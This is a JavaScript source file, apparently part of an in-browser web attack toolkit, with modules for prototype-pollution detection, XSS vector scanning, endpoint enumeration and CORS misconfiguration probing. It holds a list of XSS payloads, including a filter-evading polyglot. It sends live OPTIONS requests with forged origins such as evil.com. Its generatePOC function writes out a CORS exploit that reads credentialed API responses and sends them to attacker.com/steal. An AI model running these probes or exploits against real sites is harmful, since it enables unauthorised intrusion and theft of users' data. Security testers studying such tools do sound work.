// ULTRA MODULE 3: PROTOTYPE POLLUTION DETECTOR
// ══════════════════════════════════════════════════════════════════════════════

const PrototypePollutionDetector = {
    async detect() {
        console.log('%c🔬 Detecting Prototype Pollution Vulnerabilities...', 'color: #f43f5e; font-weight: bold;');
        const vulns = [];
        
        // Test common gadgets
        const tests = [
            { payload: '?__proto__[test]=polluted', prop: 'test' },
            { payload: '?constructor[prototype][test]=polluted', prop: 'test' },
            { payload: '?__proto__.test=polluted', prop: 'test' }
        ];
        
        // Check if Object.prototype is already polluted
        const obj = {};
        for (const key of ['isAdmin', 'admin', 'role', 'authenticated', 'test', 'innerHTML', 'src']) {
            if (obj[key] !== undefined) {
                vulns.push({ type: 'PROTOTYPE_POLLUTION', property: key, value: obj[key] });
                console.log(`%c  ⚠️ POLLUTED: Object.prototype.${key} = ${obj[key]}`, 'color: #f43f5e;');
            }
        }
        
        // Check URL for pollution patterns
        const url = window.location.href;
        if (url.includes('__proto__') || url.includes('constructor[prototype]')) {
            vulns.push({ type: 'PP_IN_URL', url: url });
            console.log('%c  ⚠️ Prototype pollution pattern in URL!', 'color: #f43f5e;');
        }
        
        // Check for vulnerable libraries
        const vulnerableLibs = [];
        if (window.$ && window.$.fn && window.$.fn.jquery) {
            const version = window.$.fn.jquery;
            if (version < '3.4.0') {
                vulnerableLibs.push({ lib: 'jQuery', version, vuln: 'CVE-2019-11358' });
            }
        }
        
        if (window._ && window._.VERSION) {
            const version = window._.VERSION;
            if (version < '4.17.12') {
                vulnerableLibs.push({ lib: 'Lodash', version, vuln: 'CVE-2019-10744' });
            }
        }
        
        vulnerableLibs.forEach(v => {
            console.log(`%c  ⚠️ Vulnerable ${v.lib} ${v.version} - ${v.vuln}`, 'color: #f43f5e;');
            vulns.push(v);
        });
        
        console.log(`%c✅ PP Detection complete. Found ${vulns.length} issues.`, 'color: #22c55e;');
        return vulns;
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// ULTRA MODULE 4: XSS VECTOR FINDER
// ══════════════════════════════════════════════════════════════════════════════

const XSSVectorFinder = {
    vectors: [],
    
    scan() {
        console.log('%c🔥 Scanning for XSS Vectors...', 'color: #f43f5e; font-weight: bold;');
        this.vectors = [];
        
        // Check URL parameters reflected in page
        const params = new URLSearchParams(window.location.search);
        const pageContent = document.documentElement.outerHTML;
        
        params.forEach((value, key) => {
            if (pageContent.includes(value) && value.length > 2) {
                this.vectors.push({
                    type: 'REFLECTED_PARAM',
                    param: key,
                    value: value,
                    payload: `${key}=<script>alert(1)</script>`
                });
                console.log(`%c  ⚠️ Reflected param: ${key}`, 'color: #f43f5e;');
            }
        });
        
        // Check dangerous innerHTML usage
        const dangerousSinks = document.querySelectorAll('[onclick], [onerror], [onload], [onmouseover]');
        dangerousSinks.forEach(el => {
            this.vectors.push({
                type: 'EVENT_HANDLER',
                element: el.tagName,
                handler: el.getAttribute('onclick') || el.getAttribute('onerror')
            });
        });
        
        // Check for eval() usage in scripts
        document.querySelectorAll('script').forEach(script => {
            const code = script.textContent || '';
            if (code.includes('eval(') || code.includes('Function(') || code.includes('.innerHTML')) {
                this.vectors.push({
                    type: 'DANGEROUS_FUNCTION',
                    snippet: code.substring(0, 200)
                });
            }
        });
        
        // Check for DOM clobbering
        const domClobber = ['name', 'id'].map(attr => {
            return document.querySelector(`[${attr}="location"]`) ||
                   document.querySelector(`[${attr}="document"]`) ||
                   document.querySelector(`[${attr}="window"]`);
        }).filter(Boolean);
        
        domClobber.forEach(el => {
            this.vectors.push({ type: 'DOM_CLOBBERING', element: el.outerHTML.substring(0, 100) });
        });
        
        console.log(`%c✅ XSS Scan complete. Found ${this.vectors.length} vectors.`, 'color: #22c55e;');
        return this.vectors;
    },
    
    generatePayloads() {
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">',
            '{{constructor.constructor("alert(1)")()}}',
            '${alert(1)}',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
        ];
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// ULTRA MODULE 5: SUBDOMAIN & ENDPOINT ENUMERATOR
// ══════════════════════════════════════════════════════════════════════════════

const EndpointEnumerator = {
    endpoints: new Set(),
    
    enumerate() {
        console.log('%c🌐 Enumerating Endpoints...', 'color: #3b82f6; font-weight: bold;');
        
        // From all href/src/action attributes
        document.querySelectorAll('a[href], link[href], script[src], img[src], iframe[src], form[action]').forEach(el => {
            const url = el.href || el.src || el.action;
            if (url) this.endpoints.add(url);
        });
        
        // From inline scripts
        document.querySelectorAll('script').forEach(script => {
            const code = script.textContent || '';
            
            // API endpoints
            const apiMatches = code.match(/['"`](\/api\/[^'"`\s]+)['"`]/g) || [];
            apiMatches.forEach(m => this.endpoints.add(m.replace(/['"`]/g, '')));
            
            // Full URLs
            const urlMatches = code.match(/https?:\/\/[^\s'"`<>]+/g) || [];
            urlMatches.forEach(url => this.endpoints.add(url));
            
            // Relative paths
            const pathMatches = code.match(/['"`](\/[a-zA-Z][^'"`\s]{2,})['"`]/g) || [];
            pathMatches.forEach(m => this.endpoints.add(m.replace(/['"`]/g, '')));
        });
        
        // From fetch/XHR in network
        if (window.__NEXUS__?.NetworkInterceptor?.requests) {
            window.__NEXUS__.NetworkInterceptor.requests.forEach(r => {
                this.endpoints.add(r.url);
            });
        }
        
        console.log(`%c✅ Found ${this.endpoints.size} endpoints.`, 'color: #22c55e;');
        
        // Categorize
        const apis = [...this.endpoints].filter(e => e.includes('/api/') || e.includes('/v1/') || e.includes('/v2/'));
        const internal = [...this.endpoints].filter(e => e.includes('localhost') || e.includes('127.0.0.1') || e.includes('.internal'));
        
        console.log(`%c   📍 API Endpoints: ${apis.length}`, 'color: #3b82f6;');
        apis.slice(0, 10).forEach(e => console.log(`%c      ${e}`, 'color: #93c5fd;'));
        
        if (internal.length > 0) {
            console.log(`%c   ⚠️ Internal Endpoints: ${internal.length}`, 'color: #f43f5e;');
            internal.forEach(e => console.log(`%c      ${e}`, 'color: #fca5a5;'));
        }
        
        return [...this.endpoints];
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// ULTRA MODULE 6: CORS MISCONFIGURATION DETECTOR
// ══════════════════════════════════════════════════════════════════════════════

const CORSDetector = {
    async detect() {
        console.log('%c🔓 Detecting CORS Misconfigurations...', 'color: #f43f5e; font-weight: bold;');
        const vulns = [];
        
        // Test endpoints for CORS issues
        const testOrigins = [
            'https://evil.com',
            'https://attacker.com', 
            `https://${window.location.hostname}.evil.com`,
            'null'
        ];
        
        // Get some API endpoints to test
        const endpoints = [];
        document.querySelectorAll('script').forEach(script => {
            const code = script.textContent || '';
            const matches = code.match(/['"`](\/api\/[^'"`\s]+)['"`]/g) || [];
            matches.forEach(m => endpoints.push(window.location.origin + m.replace(/['"`]/g, '')));
        });
        
        // Test first 3 endpoints
        for (const endpoint of endpoints.slice(0, 3)) {
            for (const origin of testOrigins) {
                try {
                    const response = await fetch(endpoint, {
                        method: 'OPTIONS',
                        headers: { 'Origin': origin }
                    });
                    
                    const acao = response.headers.get('Access-Control-Allow-Origin');
                    const acac = response.headers.get('Access-Control-Allow-Credentials');
                    
                    if (acao === '*' || acao === origin) {
                        vulns.push({
                            endpoint,
                            origin,
                            acao,
                            acac,
                            severity: acac === 'true' ? 'CRITICAL' : 'HIGH'
                        });
                        console.log(`%c  ⚠️ CORS: ${endpoint}`, 'color: #f43f5e;');
                        console.log(`%c     Origin: ${origin} → ACAO: ${acao}`, 'color: #fca5a5;');
                    }
                } catch(e) {}
            }
        }
        
        console.log(`%c✅ CORS Detection complete. Found ${vulns.length} issues.`, 'color: #22c55e;');
        return vulns;
    },
    
    generatePOC(vuln) {
        return `
<!-- CORS Exploit POC for ${vuln.endpoint} -->
<script>
fetch('${vuln.endpoint}', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // Exfiltrate to attacker
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
</script>`;
    }
};

